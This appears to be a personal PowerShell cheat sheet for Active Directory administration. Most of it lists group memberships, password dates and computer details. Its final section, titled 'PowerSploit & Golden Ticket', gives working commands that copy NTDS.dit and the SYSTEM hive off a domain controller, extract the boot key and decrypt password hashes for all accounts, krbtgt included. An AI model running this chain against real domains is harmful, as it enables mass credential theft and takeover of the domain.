PS sysadmin useful queries
-----------------------------------------------

* Installing telnet clients   : 	
```
Import-module servermanager
  Add-windowsfeature telnet-client
```

* ActiveDirectory module mandatory for the following commands : 	
```
Import-module ActiveDirectory
```

* Listing User Groups   : 	
```
Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf 
```

* Listing Group Members :
```
Get-ADGroup EMEA-PXY-Web-ReadWrite -Property * | Select-Object -ExpandProperty Member 
```

* PasswordLastSet       :
```
Get-ADUser 'x123456' -properties PasswordLastSet | Format-List
```

* Matching Group Name for USB : 
```
Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'DEVICECONTROL'
```

* Matching Group Name for DA : 	
```
Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'Domain Admins'
```

* Matching Group Name 2 : 	
```
Get-ADPrincipalGroupMembership -Identity x123456 | Select-Object -ExpandProperty MemberOf  | Where-Object {$_.name -like '*DEVICECONTROL*' } 		
```

* Listing Computer Info : 	
```
Get-ADComputer -Filter {Name -Like "dell-xps*"} -Property * | Format-Table Name,OperatingSystem,OperatingSystemServicePack,OperatingSystemVersion -Wrap -Auto
```

* Listing Win > 6.1 	: 
```
Get-ADComputer -Filter {OperatingSystemVersion -ge "6.1"} -Property * | Format-Table Name,OperatingSystem,OperatingSystemVersion -Wrap -Auto
```

PS script for detailled listing of Group Members
---------------------------------------------

```
Get-ADgroup EMEA-PXY-Web-ReadWrite -Property * | Select-Object -ExpandProperty Members
Get-ADgroup EMEA-PXY-Web-ReadWriteUpload -Property * | Select-Object -ExpandProperty Members

import-module activeDirectory

$GroupMember = "EMEA-PXY-Web-ReadWriteUpload"
$ResultFileName = "C:\Users\x123456\Documents\EMEA-PXY-Web-ReadWriteUpload.csv"

$Members=Get-ADGroupMember -identity $GroupMember -recursive 

$Result = @();

foreach ($Member in $Members){
    $User = Get-ADObject $Member -Properties name,displayName,department;
        
    $result += New-object -TypeName psobject -Property @{
        'Compte AD'=$User.name;
        'Nom Prenom'=$User.displayName;
        'Direction-Service'=$User.department;
     }
}

$Result|Export-csv -path $ResultFileName -delimiter ';' -NoTypeInformation -Encoding UTF8 -Force;
Type $ResultFileName
```

PS TO TEST
-------------------------------------------------------------------------
# Loading Active Directory Module
Try { get-module -listavailable | Where-Object {$_.name -like "ActiveDirectory*"} | import-module -ErrorAction Stop }
# Chargement du module ActiveDirectory
Catch {
Log "[ERROR] ActiveDirectory Module couldn't be loaded. Script will stop!"
Exit 1
} 
$user = Read-Host "What is your username ? "

Write-Host "All properties:"
Get-Aduser $user -property *
Write-Host "Email Address:"
Get-Aduser $user -Properties emailaddress
Write-Host "USB Rights:"
Get-ADPrincipalGroupMembership -Identity $user | select Name | Where-Object {$_.name -like '*DEVICECONTROL*' }

Write-Host "Get-Aduser $user -property *"
Write-Host "Get-Aduser $user -property *"
Write-Host "Get-Aduser $user -Property emailaddress"
Write-Host "Get-aduser x153063 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'DEVICECONTROL'"
Write-Host "Get-ADPrincipalGroupMembership -Identity X153063  | select Name | Where-Object {$_.name -like '*DEVICECONTROL*' }"

Other windows sysadmin tools
--------------------------------------------------------------------------------------------------------------------------------

```
adfind -h ADS123456 -s subtree -u DOM\x123456 -up %1 -simple -f cn=x123456  -csv -tdc -b ou="utilisateurs,ou=DOM,dc=DOM"  sn givenname mailnickname department memberof 
```

* Listing domains :
```
nltest /dclist:emea
```

PowerSploit & Golden Ticket
--------------------------------------------------------------------------------------------------------------------------------

- Télécharger/Installer les cmdlets DSInternals: https://github.com/MichaelGrafnetter/DSInternals/wiki/Installation
- Télécharger/Installer les cmdlets PowserSploit: Import-module Exfiltration

```
Copy-Item \\DCxxx\C$\Windows\System32\NTDS.dit -destination C:\Users\xxxxxx\Downloads
FAILED : Copy-Item \\DCxxx\C$\Windows\System32\config\system -destination C:\Users\x123456\Downloads
FAILED : Copy-Item \\DCxxx\C$\Windows\System32\config -destination C:\Users\x123456\Downloads -recurse

Enter-PSSession -ComputerName DCxxx
PS DCxxx> reg export HKLM\SYSTEM .\SYSTEM.hiv
PS DCxxx> exit
Copy-Item \\DCxxx\C$\Users\johndoe_fr\Documents\SYSTEM.hiv -destination C:\Users\x123456\Downloads
```

https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/

First, we fetch the so-called Boot Key (aka SysKey)
# that is used to encrypt sensitive data in AD:
```
$key = Get-BootKey -SystemHivePath 'C:\IFM\registry\SYSTEM'
```

# We then load the DB and decrypt password hashes of all accounts:
```
Get-ADDBAccount -All -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 
 ```

# We can also get a single account by specifying its distinguishedName,
# objectGuid, objectSid or sAMAccountName atribute:
```
Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=Adatum,DC=com' `
        -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\Sysvol
```
